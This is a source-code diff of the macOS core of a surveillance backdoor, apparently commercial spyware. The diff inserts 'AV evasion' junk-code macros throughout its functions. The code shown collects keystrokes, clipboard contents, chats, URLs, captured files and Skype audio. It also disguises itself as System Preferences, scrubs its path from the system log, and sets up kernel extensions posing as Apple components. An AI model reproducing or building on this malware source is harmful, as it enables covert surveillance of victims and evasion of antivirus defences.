@@ -46,6 +46,8 @@
 #import "NSApplication+SystemVersion.h"
 #import "NSMutableData+SHA1.h"
 
+#import "RCSMAVGarbage.h"
+
 #define ICON_FILENAME  @"q45tyh"
 
 //
@@ -104,12 +106,18 @@ static BOOL gHasVoipOutFinishedRecording;
 static int gBackdoorFD = 0;
 
 io_registry_entry_t getRootDomain(void)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   static io_registry_entry_t gRoot = MACH_PORT_NULL;
   
   if (MACH_PORT_NULL == gRoot)
     gRoot = IORegistryEntryFromPath(kIOMasterPortDefault,
                                     kIOPowerPlane ":/IOPowerConnection/IOPMrootDomain");
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return gRoot;
 }
@@ -192,7 +200,10 @@ static void computerWillShutdown(CFMachPortRef port,
                                  void *msg,
                                  CFIndex size,
                                  void *info)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   mach_msg_header_t *header = (mach_msg_header_t *)msg;
   static bool shouldShutdown = false;
   
@@ -221,6 +232,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       // Whatever shutdown, restart, or logout that was in progress has been cancelled.
       shouldShutdown = false;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
     }
   else if (shouldShutdown 
            && (header->msgh_id == gLWLogoutPointOfNoReturnNotificationToken))
@@ -233,6 +248,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"Ok we're really shutting down NOW");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       const char *userName = [NSUserName() UTF8String];
       ioctl(gBackdoorFD, MCHOOK_UNREGISTER, userName);
@@ -305,7 +323,10 @@ static void computerWillShutdown(CFMachPortRef port,
 @implementation __m_MCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
 #ifdef DEBUG_CORE
   warnLog(@"Spoofing and relaunching ourself, appName is %@", mApplicationName);
 #endif
@@ -317,6 +338,9 @@ static void computerWillShutdown(CFMachPortRef port,
   [[NSFileManager defaultManager] copyItemAtPath: [[NSBundle mainBundle] executablePath]
                                           toPath: mSpoofedName
                                            error: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   //
   // Executing ourself with the new executable name and exit
@@ -332,7 +356,10 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (int)_createAdvisoryLock: (NSString *)lockFile
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSError *error;
   BOOL success = [@"" writeToFile: lockFile
                        atomically: NO
@@ -343,7 +370,10 @@ static void computerWillShutdown(CFMachPortRef port,
   // Here we might get a privilege error in case the lock is on
   //
   if (success == YES)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
       NSFileHandle *lockFileHandle = [NSFileHandle fileHandleForReadingAtPath:
                                       lockFile];
 #ifdef DEBUG_CORE
@@ -353,6 +383,9 @@ static void computerWillShutdown(CFMachPortRef port,
       if (lockFileHandle)
         {
           int fd = [lockFileHandle fileDescriptor];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           if (flock(fd, LOCK_EX | LOCK_NB) != 0)
             {
@@ -383,11 +416,17 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return -1;
 }
 
 - (void)_checkSystemLog
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
   NSMutableString *fileData     = [[NSMutableString alloc]
                                    initWithContentsOfFile: @"/var/log/system.log"];
@@ -397,6 +436,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                    [[[NSBundle mainBundle] bundlePath]
                                     stringByAppendingPathComponent: @"System Preferences"]];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   u_int size = 400;
   u_int startOfft = ([fileData length] > size)
                       ? [fileData length] - size
@@ -405,6 +447,9 @@ static void computerWillShutdown(CFMachPortRef port,
   u_int len = ([fileData length] > size)
                 ? size
                 : [fileData length];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   [fileData replaceOccurrencesOfString: backdoorPath
                             withString: @"/Applications/System Preferences.app/Contents/MacOS/System Preferences"
@@ -416,6 +461,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                options: NSCaseInsensitiveSearch
                                  range: NSMakeRange(startOfft, len)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [fileData writeToFile: @"/var/log/system.log"
              atomically: YES
                encoding: NSUTF8StringEncoding
@@ -425,6 +473,9 @@ static void computerWillShutdown(CFMachPortRef port,
                              @"root:admin",
                              @"/var/log/system.log",
                              nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [gUtil executeTask: @"/usr/sbin/chown"
         withArguments: _tempArguments
@@ -439,7 +490,10 @@ static void computerWillShutdown(CFMachPortRef port,
                   withSize: (u_int)audioChunkSize
                   channels: (u_int)channels
                   forInput: (BOOL)isInput
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
 #define SPEEX_MODE_UWB        2
 #define SINGLE_LPCM_UNIT_SIZE 4 // sizeof(float)
   // Single lpcm unit already casted to SInt16
@@ -465,6 +519,9 @@ static void computerWillShutdown(CFMachPortRef port,
   u_int complexity      = 1;
   u_int quality         = (gSkypeQuality != 0) ? gSkypeQuality : 5;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
   
   // Create a new wide mode encoder
@@ -474,10 +531,16 @@ static void computerWillShutdown(CFMachPortRef port,
   speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);
   speex_encoder_ctl(speexState, SPEEX_SET_COMPLEXITY, &complexity);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   speex_bits_init(&speexBits);
   
   // Get frame size for given quality and compression factor
   speex_encoder_ctl(speexState, SPEEX_GET_FRAME_SIZE, &frameSize);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (!frameSize)
     {
@@ -486,6 +549,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
@@ -505,6 +572,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
@@ -526,6 +597,9 @@ static void computerWillShutdown(CFMachPortRef port,
       return FALSE;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   //
   // Allocate the conversion buffer
   //
@@ -538,6 +612,10 @@ static void computerWillShutdown(CFMachPortRef port,
       free(inputBuffer);
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
@@ -554,6 +632,9 @@ static void computerWillShutdown(CFMachPortRef port,
       floatToSInt16Buffer[j++] = value;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   ptrSInt16Buffer = (char *)floatToSInt16Buffer;
 #ifdef DEBUG_SPEEX
   verboseLog(@"Audio Chunk SIZE: %d", audioChunkSize);
@@ -562,11 +643,17 @@ static void computerWillShutdown(CFMachPortRef port,
   NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
   NSMutableData *audioData        = [[NSMutableData alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
   
   NSString *riff    = @"RIFF";
   NSString *waveFmt = @"WAVEfmt ";
   NSString *data    = @"data";
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   int audioSize = audioChunkSize / 2;
   int fileSize = audioSize + 44; // size of header + strings
@@ -579,6 +666,9 @@ static void computerWillShutdown(CFMachPortRef port,
   waveFileHeader->bitsPerSample   = 16;
   waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
   waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   //waveFileHeader->blockAlign      = waveFileHeader->nAvgBytesPerSec = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
   
@@ -594,6 +684,9 @@ static void computerWillShutdown(CFMachPortRef port,
   [audioData appendBytes: &audioSize
                   length: sizeof(int)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Append audio chunk
   [audioData appendBytes: floatToSInt16Buffer
                   length: audioChunkSize / 2];
@@ -603,11 +696,17 @@ static void computerWillShutdown(CFMachPortRef port,
   
   NSString *fileName = [[NSString alloc] initWithFormat: @"/tmp/tempAudio-%d.wav", t];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [audioData writeToFile: fileName
               atomically: YES];
   
   [headerData release];
   [audioData release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSMutableData *fileData = [[NSMutableData alloc] init];
 #endif
@@ -629,8 +728,14 @@ static void computerWillShutdown(CFMachPortRef port,
           inputBuffer[i] =  bitSample[i * channels] - (bitSample[i * channels] / 4);
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       speex_bits_reset(&speexBits);
       speex_encode_int(speexState, inputBuffer, &speexBits);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       // Encode and store the result in the outputBuffer + first dword (length)
       bytesWritten = speex_bits_write(&speexBits,
@@ -641,6 +746,9 @@ static void computerWillShutdown(CFMachPortRef port,
       if (bytesWritten > (frameSize * SINGLE_LPCM_UNIT_SIZE))
         continue;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // Store the audioChunk size in the first dword of outputBuffer
       memcpy(outputBuffer, &bytesWritten, sizeof(u_int));
       
@@ -650,7 +758,10 @@ static void computerWillShutdown(CFMachPortRef port,
                                                                   length: bytesWritten + sizeof(u_int)];
 #ifdef DEBUG_SPEEX
           [fileData appendData: tempData];
-#endif
+#endif  
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [_logManager writeDataToLog: tempData
                              forAgent: AGENT_VOIP// + VOIP_SKYPE
                             withLogID: SKYPE_CHANNEL_INPUT];
@@ -664,9 +775,16 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_SPEEX
           [fileData appendData: tempData];
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           [_logManager writeDataToLog: tempData
                              forAgent: AGENT_VOIP// + VOIP_SKYPE
                             withLogID: SKYPE_CHANNEL_OUTPUT];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
           
           [tempData release];
         }
@@ -675,6 +793,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_SPEEX
   time_t ut;
   time(&ut);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSString *outFile = [[NSString alloc] initWithFormat: @"/tmp/speexEncoded-%d.wav", ut];
   
@@ -689,8 +810,14 @@ static void computerWillShutdown(CFMachPortRef port,
   free(outputBuffer);
   free(floatToSInt16Buffer);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   speex_encoder_destroy(speexState);
   speex_bits_destroy(&speexBits);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   return TRUE;
 }
@@ -702,6 +829,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
   int x = 0;
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   shMemoryLog *shMemLog;
   __m_MLogManager *_logManager   = [__m_MLogManager sharedInstance];
@@ -723,6 +853,9 @@ static void computerWillShutdown(CFMachPortRef port,
   localFlag = [_taskManager getControlFlag];
   [gControlFlagLock unlock];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   while ([localFlag isEqualToString: @"RUNNING"])
     {
       NSAutoreleasePool *innerPool  = [[NSAutoreleasePool alloc] init];
@@ -733,6 +866,9 @@ static void computerWillShutdown(CFMachPortRef port,
       
       NSMutableData *logData        = nil;
       NSMutableData *readData       = nil;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       readData = [gSharedMemoryLogging readMemoryFromComponent: COMP_CORE
                                                       forAgent: 0
@@ -747,11 +883,17 @@ static void computerWillShutdown(CFMachPortRef port,
           
 #ifdef DEBUG_CORE         
           verboseLog(@"Logging shMemLog->agentID = 0x%x", shMemLog->agentID);
-#endif          
+#endif       
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           switch (shMemLog->agentID)
             {
             case AGENT_URL:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_006
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
                 
@@ -767,7 +909,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_KEYLOG:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_007
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
 
@@ -788,7 +933,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_APPLICATION:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_007
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
                 
@@ -808,7 +956,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_MOUSE:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_008
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from mouse");
 #endif
@@ -886,7 +1037,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_VOIP:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_009
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from Voip Agent");
 #endif
@@ -1233,7 +1387,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_CHAT:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_000
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from agent CHAT");
 #endif    
@@ -1257,7 +1414,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_CLIPBOARD:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_000
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from clipboard");
 #endif
@@ -1277,7 +1437,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_INTERNAL_FILEOPEN:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_005
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
 
@@ -1293,7 +1456,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case AGENT_INTERNAL_FILECAPTURE:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_003
+                
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
 
@@ -1322,7 +1488,10 @@ static void computerWillShutdown(CFMachPortRef port,
                 break;
               }
             case LOG_URL_SNAPSHOT:
-              {
+              {  
+                // AV evasion: only on release build
+                AV_GARBAGE_006
+                
 #ifdef DEBUG_CORE
                 verboseLog(@"Logs from url snapshot");
 #endif
@@ -1434,7 +1603,10 @@ static void computerWillShutdown(CFMachPortRef port,
         agentIndex = 0;
       else
         agentIndex++;
-#endif 
+#endif   
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       if (logData != nil)
         {
           [logData release];
@@ -1444,6 +1616,9 @@ static void computerWillShutdown(CFMachPortRef port,
         {
           [readData release];
         }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       NSMutableDictionary *agentConfiguration = [_taskManager getConfigForAgent: AGENT_VOIP];
       
@@ -1460,6 +1635,9 @@ static void computerWillShutdown(CFMachPortRef port,
           if (x == 0)
             infoLog(@"Got skype conf");
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
           
           if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
               || [agentConfiguration objectForKey: @"status"] == AGENT_START)
@@ -1494,6 +1672,9 @@ static void computerWillShutdown(CFMachPortRef port,
         x++;
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       [innerPool drain];
     }
   
@@ -1505,7 +1686,10 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (void)_guessNames
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
 #ifdef DEV_MODE
 //  unsigned char result[CC_MD5_DIGEST_LENGTH];
 //  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
@@ -1519,6 +1703,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                 length: CC_MD5_DIGEST_LENGTH];
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   __m_MEncryption *_encryption = [[__m_MEncryption alloc] initWithKey: temp];
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   NSString *_backdoorName = nil;
@@ -1528,8 +1715,14 @@ static void computerWillShutdown(CFMachPortRef port,
       NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                  [[NSBundle mainBundle] bundlePath]];
       
-      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
+      NSArray *_searchedFile = searchForProtoUpload(searchPattern);  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       [searchPattern release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       if ([_searchedFile count] > 0)
         {
@@ -1549,11 +1742,17 @@ static void computerWillShutdown(CFMachPortRef port,
   gBackdoorUpdateName = [_encryption scrambleForward: _backdoorName
                                                 seed: ALPHABET_LEN / 2];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if ([gBackdoorName isLessThan: gBackdoorUpdateName])
     {
 #ifdef DEBUG_CORE
       infoLog(@"gBackdoor");
-#endif
+#endif  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       gConfigurationName = [_encryption scrambleForward: _backdoorName
                                                    seed: 1];
     }
@@ -1576,7 +1775,10 @@ static void computerWillShutdown(CFMachPortRef port,
                                                       seed: 8];
   gKext64Name               = [_encryption scrambleForward: gConfigurationName
                                                       seed: 16];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
 #ifdef DEBUG_CORE
   if ([gBackdoorName isEqualToString: @"System Preferences"] == NO)
     {
@@ -1595,7 +1797,10 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (void)_createInternalFilesAndFolders
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
 #ifdef DEBUG_CORE
   infoLog(@"");
 #endif
@@ -1606,6 +1811,9 @@ static void computerWillShutdown(CFMachPortRef port,
   [task setLaunchPath: @"/usr/bin/uname"];
   [task setArguments: _commArguments];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSPipe *pipe = [NSPipe pipe];
   [task setStandardOutput: pipe];
   [task setStandardError: pipe];
@@ -1613,7 +1821,10 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [task launch];
   [task waitUntilExit];
-         
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSData *taskData      = [file readDataToEndOfFile];
   NSString *taskOutput  = [[NSString alloc] initWithData: taskData
                                                 encoding: NSUTF8StringEncoding];
@@ -1629,6 +1840,9 @@ static void computerWillShutdown(CFMachPortRef port,
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 8];
   NSMutableDictionary *innerDict;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if ([gUtil isLeopard])
     {
       innerDict = [NSMutableDictionary dictionaryWithCapacity: 1];
@@ -1641,6 +1855,9 @@ static void computerWillShutdown(CFMachPortRef port,
       [innerDict setObject: taskOutput forKey: @"com.apple.kpi.libkern"];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
   [rootObj setObject: @"com.apple.mdworker" forKey: @"CFBundleIdentifier"];
   [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
@@ -1649,7 +1866,10 @@ static void computerWillShutdown(CFMachPortRef port,
   [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
   [rootObj setObject: @"2.0" forKey: @"CFBundleVersion"];
   [rootObj setObject: innerDict forKey: @"OSBundleLibraries"];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (is64bitKernel())
     {
 #ifdef DEBUG_CORE
@@ -1670,6 +1890,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                                                format: NSPropertyListXMLFormat_v1_0
                                                      errorDescription: &err];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     @"Contents"];
@@ -1677,11 +1900,18 @@ static void computerWillShutdown(CFMachPortRef port,
   
   _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources",
                           [[NSBundle mainBundle] bundlePath]];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   mkdir([_backdoorContentPath UTF8String], 0755);
   
   _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/MacOS",
                           [[NSBundle mainBundle] bundlePath]];
   mkdir([_backdoorContentPath UTF8String], 0755);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (is64bitKernel())
     {
@@ -1695,19 +1925,28 @@ static void computerWillShutdown(CFMachPortRef port,
                               gKext64Name,
                               @"Contents"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext64Name,
                               @"Contents/Resources"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext64Name,
                               @"Contents/MacOS"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext64Name,
@@ -1719,36 +1958,54 @@ static void computerWillShutdown(CFMachPortRef port,
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"Contents"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"Contents/Resources"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"Contents/MacOS"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"/Contents/Info.plist"];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
 
   NSString *tempKextDir;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (is64bitKernel())
     {
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
@@ -1756,7 +2013,10 @@ static void computerWillShutdown(CFMachPortRef port,
                               gKext64Name,
                               @"/Contents/MacOS",
                               gKext64Name];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                      [[NSBundle mainBundle] bundlePath],
                      gKext64Name];
@@ -1768,7 +2028,10 @@ static void computerWillShutdown(CFMachPortRef port,
                               gKext32Name,
                               @"/Contents/MacOS",
                               gKext32Name];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                      [[NSBundle mainBundle] bundlePath],
                      gKext32Name];
@@ -1782,7 +2045,10 @@ static void computerWillShutdown(CFMachPortRef port,
   [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
                                           toPath: _backdoorContentPath
                                            error: nil];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [tempKextDir release];
   [taskOutput release];
 
@@ -1796,7 +2062,9 @@ static void computerWillShutdown(CFMachPortRef port,
     {
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
                               [[NSBundle mainBundle] bundlePath],
-                              gKext32Name];
+                              gKext32Name];  
+      // AV evasion: only on release build
+      AV_GARBAGE_002
     }
   NSArray *arguments = [NSArray arrayWithObjects:
                         @"-R",
@@ -1806,7 +2074,10 @@ static void computerWillShutdown(CFMachPortRef port,
   [gUtil executeTask: @"/usr/sbin/chown"
        withArguments: arguments
         waitUntilEnd: YES];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   //
   // Backdoor .app Info.plist
   //
@@ -1828,6 +2099,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                                        format: NSPropertyListXMLFormat_v1_0
                                              errorDescription: nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   _backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           @"Contents/Info.plist"];
@@ -1843,12 +2117,18 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (void)_resizeSharedMemoryWindow
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if (getuid() == 0 || geteuid() == 0)
     {
 #ifdef DEBUG_CORE
       warnLog(@"High Privs mode, big shared memory");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       //
       // Let's change the default shared memory max size to a better value
@@ -1861,6 +2141,9 @@ static void computerWillShutdown(CFMachPortRef port,
       [gUtil executeTask: @"/usr/sbin/sysctl"
            withArguments: _arguments
             waitUntilEnd: YES];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       _arguments = [NSArray arrayWithObjects:
                     @"-w",
@@ -1892,15 +2175,24 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (BOOL)_createAndInitSharedMemory
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
   key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   // init shared memory
   gSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   gSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
@@ -1908,6 +2200,9 @@ static void computerWillShutdown(CFMachPortRef port,
   // on backdoor startup try to remove mapped file
   [gSharedMemoryCommand removeMappedFile];
   [gSharedMemoryLogging removeMappedFile];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   //
   // Create and initialize the shared memory segments
@@ -1928,7 +2223,13 @@ static void computerWillShutdown(CFMachPortRef port,
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [gSharedMemoryCommand zeroFillMemory];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if ([gSharedMemoryLogging createMemoryRegion] == -1)
     {
@@ -1938,6 +2239,9 @@ static void computerWillShutdown(CFMachPortRef port,
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if ([gSharedMemoryLogging attachToMemoryRegion] == -1)
     {
 #ifdef DEBUG_CORE
@@ -1946,13 +2250,19 @@ static void computerWillShutdown(CFMachPortRef port,
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
